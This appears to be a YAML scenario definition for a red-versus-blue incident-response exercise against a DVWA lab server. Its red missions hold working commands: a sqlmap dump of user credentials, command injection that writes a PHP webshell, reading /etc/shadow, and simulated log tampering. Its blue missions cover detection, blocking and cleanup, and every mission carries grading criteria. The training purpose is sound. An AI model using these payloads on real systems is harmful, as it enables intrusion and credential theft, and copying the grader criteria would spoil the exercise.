id: "incident-response"
title: "인시던트 대응 시뮬레이션"
description: "보안 관제 센터(SOC)에서 웹 서버 침해 의심 알림이 발생했다. Red Team은 SQLi, 웹셸 업로드, 권한 상승을 복합적으로 수행하여 전면적인 침해를 시도한다. Blue Team은 NIST 인시던트 대응 프로세스에 따라 탐지, 분석, 격리, 복구를 체계적으로 수행해야 한다."
difficulty: "hard"
time_limit: 3600
battle_type: "1v1"

red_missions:
  - order: 1
    instruction: "1단계 - SQLi로 DVWA 데이터베이스에서 관리자 크리덴셜을 추출하라."
    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch -T users --dump 2>&1 | tail -20"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "admin"
      semantic:
        intent: "Cyber Kill Chain Phase 2 (Credential Access) — DVWA users 테이블에서 admin password hash 추출. 후속 단계 (privilege escalation) 의 prerequisite. MITRE T1003 + OWASP A03."
        success_criteria:
          - "sqlmap --dump -T users 명령 (--batch 자동 응답)"
          - "PHPSESSID + security=low 쿠키 (인증 컨텍스트)"
          - "응답에 admin row + password hash (32자 hex MD5) 노출"
        acceptable_methods:
          - "sqlmap --dump -T users -D dvwa"
          - "curl + UNION SELECT user, password FROM users--"
          - "Burp Intruder 로 manual UNION"
        negative_signs:
          - "DB 목록만 추출 + users 테이블 dump 안 함"
          - "쿠키 누락 → 로그인 redirect"
          - "admin row 없이 다른 사용자만 노출"

  - order: 2
    instruction: "2단계 - Command Injection으로 웹 서버에 PHP 웹셸을 생성하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;echo+\"<?php+system(\\$_GET[c]);+?>\">/var/www/html/cmd.php+2>&1;echo+webshell_created&Submit=Submit'"
    points: 20
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "webshell_created"
      semantic:
        intent: "Phase 3 (Initial Access + Persistence) — DVWA exec 의 OS Command Injection 으로 웹셸 file write. 영속 backdoor 확보. MITRE T1505.003 + OWASP A03 (cmd inject)."
        success_criteria:
          - "POST /vulnerabilities/exec/ with ip=...;<command>"
          - "echo '<?php system(\\$_GET[c]); ?>' > /var/www/html/cmd.php"
          - "응답에 webshell_created 또는 동등 confirmation"
        acceptable_methods:
          - "curl -X POST -d 'ip=127.0.0.1;<cmd>'"
          - "Burp Repeater 로 reproduce"
          - "다른 cmd inject 페이로드 (`|, &&, $())`"
        negative_signs:
          - "cmd inject 만 시도 + file write 안 함"
          - "권한 부족 (apache 가 /var/www 쓰기 권한 없음) → 다른 path 시도 안 함"
          - "PHP 구문 오류로 webshell 비기능"

  - order: 3
    instruction: "3단계 - 웹셸을 통해 시스템 정보를 수집하라."
    hint: "curl -s 'http://10.20.30.80/cmd.php?c=id;uname+-a;whoami' 2>&1 || echo 'Webshell access attempted'"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: ""
      semantic:
        intent: "Phase 4 (Discovery) — 웹셸로 system fingerprint. uid + kernel + hostname 으로 후속 escalation 경로 결정. MITRE T1082."
        success_criteria:
          - "GET /cmd.php?c=id;uname+-a;whoami (또는 동등 조합)"
          - "응답에 uid=N(user) + kernel 버전 + hostname"
          - "최소 3개 정보 항목 수집 (id/uname/whoami)"
        acceptable_methods:
          - "curl /cmd.php?c=<chained commands>"
          - "browser 직접 + cmd.php?c=ls /etc"
          - "wget --post-data로 form 호출"
        negative_signs:
          - "단일 명령만 (id) 실행 + 다른 정보 무시"
          - "응답에 명령 결과 없이 단순 200 만"
          - "encoding 오류로 명령 깨짐 (% URL 인코딩 누락)"

  - order: 4
    instruction: "4단계 - Command Injection으로 SUID 파일을 탐색하여 권한 상승 경로를 찾아라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;find+/usr/bin+-perm+-4000+-type+f+2>/dev/null|head+-10&Submit=Submit'"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "/usr"
      semantic:
        intent: "Phase 5 (Privilege Escalation) — find -perm -4000 으로 SUID 바이너리 enumerate. GTFOBins 매칭 가능한 후보 (vim/find/python) 찾기. MITRE T1548.001."
        success_criteria:
          - "find /usr/bin -perm -4000 (또는 -u+s) -type f"
          - "응답에 /usr/bin/<binary> 형식 path 1개 이상"
          - "(보너스) GTFOBins 매칭 가능 (find/vim/python 등) 식별"
        acceptable_methods:
          - "find /usr -perm -u+s -type f (동등)"
          - "find / -perm -4000 2>/dev/null (전체 시스템)"
          - "stat -c '%n %a' /usr/bin/* | grep '^.[s]'"
        negative_signs:
          - "find 결과 비어있는데 다른 디렉토리 안 시도"
          - "GTFOBins 같은 alternate path 모색 없음"
          - "head -10 안 잘랐을 때 응답 너무 길어 truncate"

  - order: 5
    instruction: "5단계 - Command Injection으로 /etc/shadow 읽기를 시도하여 패스워드 해시를 탈취하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;cat+/etc/shadow+2>&1|head+-5&Submit=Submit'"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "root"
      semantic:
        intent: "Phase 6 (Credential Access II) — /etc/shadow 의 root hash 추출 시도. apache uid 로 권한 부족 시 차단되어야 정상. SUID 우회 또는 read perm misconfig 시 노출."
        success_criteria:
          - "cat /etc/shadow (Command Injection 으로)"
          - "응답에 root: 시작하는 hash 라인 (성공) 또는 Permission denied (정상)"
          - "성공/실패 분류 + 다음 액션 명시"
        acceptable_methods:
          - "cat /etc/shadow"
          - "less /etc/shadow"
          - "if SUID escalation 가능 → sudo cat /etc/shadow"
        negative_signs:
          - "Permission denied 받고 시도 종료 (alternate access 안 모색)"
          - "/etc/passwd 만 시도 (hash 없음, shadow 가 목적)"

  - order: 6
    instruction: "6단계 - 로그 파일을 변조하여 침해 흔적을 은폐하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;echo+cleaned+>+/tmp/evidence_removed+2>&1;echo+traces_removed&Submit=Submit'"
    points: 10
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "traces_removed"
      semantic:
        intent: "Phase 7 (Defense Evasion) — anti-forensics 시뮬레이션. apache uid 로 /var/log 권한 부족 → /tmp 우회. MITRE T1070."
        success_criteria:
          - "log 파일 변조 또는 흔적 삭제 시도 (cmd inject)"
          - "권한 부족 시 /tmp 또는 home dir 로 fallback"
          - "응답에 traces_removed 또는 동등 confirm"
        acceptable_methods:
          - "echo > /var/log/apache2/access.log (권한 충분 시)"
          - "echo cleaned > /tmp/<file> (apache 권한 가능)"
          - "shred -n 3 (가능 시)"
        negative_signs:
          - "/var/log 만 시도 + Permission denied 받고 종료"
          - "anti-forensic 의도 없이 단순 file 생성"

blue_missions:
  - order: 1
    instruction: "[탐지] suricata와 Wazuh에서 현재 발생 중인 보안 알림을 확인하라."
    hint: "tail -20 /var/log/suricata/fast.log"
    points: 10
    target_vm: secu
    verify:
      type: "output_contains"
      expect: "10.20.30"
      semantic:
        intent: "NIST IR Phase 1 (Detection) — IDS/SIEM 의 1차 신호 수집. Red 의 SQLi/cmd inject 가 ET sql_injection 또는 web-attack 시그니처에 매칭됐는지."
        success_criteria:
          - "suricata fast.log 또는 eve.json 읽기"
          - "최근 alert 라인 + source IP (10.20.30.201 attacker) 식별"
          - "alert classification (sql_injection / web-attack) 분류"
        acceptable_methods:
          - "tail /var/log/suricata/fast.log"
          - "jq '.event_type==\"alert\"' eve.json | tail"
          - "Wazuh: cat /var/ossec/logs/alerts/alerts.json | tail"
          - "Kibana 대시보드 (있으면)"
        negative_signs:
          - "log 파일 읽기 실패 + alternate source 안 씀"
          - "alert 보이지만 source IP / classification 분석 없음"

  - order: 2
    instruction: "[분석] Apache 접근 로그에서 공격 벡터(SQLi, Command Injection)를 식별하라."
    hint: "grep -iE 'sqlmap|union|select|exec|cmd|vulnerabilities' /var/log/apache2/access.log | tail -30"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: "vulnerabilities"
      semantic:
        intent: "NIST IR Phase 2 (Analysis) — Apache access.log 에서 공격 패턴 식별. URL parameter 의 SQLi keyword + /vulnerabilities/exec/ POST 횟수 + User-Agent 의 sqlmap 시그니처."
        success_criteria:
          - "/var/log/apache2/access.log grep 으로 공격 키워드 매칭"
          - "User-Agent: sqlmap/N 또는 URL 의 union/select 매칭"
          - "/vulnerabilities/(sqli|exec) 호출 빈도 + IP 추출"
        acceptable_methods:
          - "grep -iE 'sqlmap|union|select|exec|/vulnerabilities/' access.log"
          - "awk '{print $1}' access.log | sort | uniq -c | sort -rn (top IP)"
          - "goaccess access.log (시각화)"
          - "ELK/Loki query"
        negative_signs:
          - "전체 dump 만 + 패턴 분류 없음"
          - "User-Agent 의 sqlmap 시그니처 놓침"

  - order: 3
    instruction: "[분석] 웹 서버에서 비인가 파일(웹셸)이 생성되었는지 확인하라."
    hint: "find /var/www -name '*.php' -newer /var/log/apache2/access.log -ls 2>/dev/null; grep -rl 'system\\|shell_exec\\|passthru' /var/www/ 2>/dev/null"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: "php"
      semantic:
        intent: "Phase 2 심화 — 웹셸 발견. 최근 생성/수정 PHP file + 위험 함수 (system/exec/passthru/eval/shell_exec) grep. Red #2 의 cmd.php 위치 확인."
        success_criteria:
          - "find /var/www -name '*.php' (최근 생성 필터)"
          - "grep -rl 'system\\|shell_exec\\|passthru\\|eval' /var/www"
          - "발견 file path + 내용 head 확인"
        acceptable_methods:
          - "find /var/www -name '*.php' -mmin -60 (최근 1시간)"
          - "grep -rl '<?php' /var/www/ + size 작은 파일 우선"
          - "yara -r webshell.yar /var/www (signature 기반)"
          - "rkhunter --propupd-only"
        negative_signs:
          - "find 만 + grep 안 함 (정상 PHP 와 webshell 구분 안 됨)"
          - "발견 file 의 내용 확인 안 함"

  - order: 4
    instruction: "[격리] nftables로 공격자 IP를 즉시 차단하라."
    hint: "nft add rule inet filter input ip saddr 10.20.30.201 log prefix '\"IR-BLOCK: \"' drop"
    points: 15
    target_vm: secu
    verify:
      type: "output_contains"
      expect: ""
      semantic:
        intent: "NIST IR Phase 3 (Containment) — attacker IP 차단. inet filter input 에 drop rule + log prefix 로 추적 가능. MITRE D3FEND containment."
        success_criteria:
          - "nft add rule inet filter input ip saddr <attacker_ip> drop"
          - "log prefix 로 차단 이벤트 추적"
          - "rule 적용 후 nft list ruleset 으로 확인"
        acceptable_methods:
          - "nft add rule + log prefix"
          - "iptables -I INPUT -s <ip> -j DROP (legacy)"
          - "fail2ban jail ban (자동화)"
          - "configure_nftables skill (전용)"
        negative_signs:
          - "drop rule 만 + log 누락 → 추적 불가"
          - "rule 등록 안 하고 단순 echo (실제 적용 안 됨)"
          - "ip saddr 잘못 (다른 IP 차단)"

  - order: 5
    instruction: "[격리] 웹셸 파일을 삭제하고 관련 악성 파일을 제거하라."
    hint: "find /var/www -name '*.php' -exec grep -l 'system\\|shell_exec\\|passthru' {} \\; -exec rm -v {} \\; 2>/dev/null; echo 'Cleanup complete'"
    points: 20
    target_vm: web
    verify:
      type: "output_contains"
      expect: "Cleanup complete"
      semantic:
        intent: "Phase 3 심화 — 발견된 웹셸 file 즉시 삭제 + audit. 단, 정상 PHP 와 구분 필수 (false positive rm 위험). 백업 우선 권장."
        success_criteria:
          - "Step 3 에서 식별된 webshell file 삭제"
          - "find + grep 으로 webshell 만 정확히 매칭"
          - "삭제 전 backup 또는 audit log (forensic 보존)"
        acceptable_methods:
          - "find ... -exec rm -v + Cleanup confirm"
          - "mv to quarantine dir (forensic 보존 우선)"
          - "shred -u (복구 차단)"
        negative_signs:
          - "정상 PHP file 도 삭제 (false positive)"
          - "backup 없이 직접 rm → forensic evidence 손실"
          - "Cleanup 완료 confirm 없음"

  - order: 6
    instruction: "[복구] Apache 서비스를 재시작하고 정상 동작을 확인하라."
    hint: "systemctl restart apache2 && systemctl status apache2 | head -5"
    points: 10
    target_vm: web
    verify:
      type: "output_contains"
      expect: "active"
      semantic:
        intent: "Phase 4 (Recovery) — 서비스 정상화. webshell 제거 후 Apache restart. graceful 권장 (active connection 보존)."
        success_criteria:
          - "systemctl restart 또는 reload apache2"
          - "status active (running) 확인"
          - "(보너스) curl localhost 로 응답 검증"
        acceptable_methods:
          - "systemctl restart + status"
          - "apachectl graceful + apachectl status"
          - "service apache2 restart (legacy)"
        negative_signs:
          - "stop만 + start 누락"
          - "configtest 안 함 (syntax error 시 down)"
          - "status 미확인 — restart 결과 unverified"

  - order: 7
    instruction: "[보고] 전체 인시던트 타임라인을 suricata 로그에서 재구성하라."
    hint: "grep '10.20.30.201' /var/log/suricata/eve.json | python3 -c \"import sys,json; [print(json.loads(l).get('timestamp','')[:19], json.loads(l).get('event_type','')) for l in sys.stdin]\" 2>/dev/null | sort | tail -30"
    points: 15
    target_vm: secu
    verify:
      type: "output_contains"
      expect: ""
      semantic:
        intent: "NIST IR Phase 5 (Post-Incident) — 타임라인 재구성. attacker IP 의 모든 alert 시간순 정렬 + event_type 분류. 보고서 + 사후 조치 lessons-learned 의 핵심."
        success_criteria:
          - "eve.json 또는 fast.log 에서 attacker IP grep"
          - "timestamp + event_type (alert/http/dns) 시간순 sort"
          - "Phase 1~6 (recon → persistence → escalation → cleanup) 매핑"
        acceptable_methods:
          - "grep + jq + sort"
          - "awk + sort"
          - "Wazuh API: GET /agents/<id>/alerts?from=...&to=..."
          - "ELK Discover query"
        negative_signs:
          - "최근 30 line 만 dump + 시간순 정렬 없음"
          - "타임라인 분석 없이 raw alert 만"
          - "공격 단계 (kill chain phase) 매핑 없음"
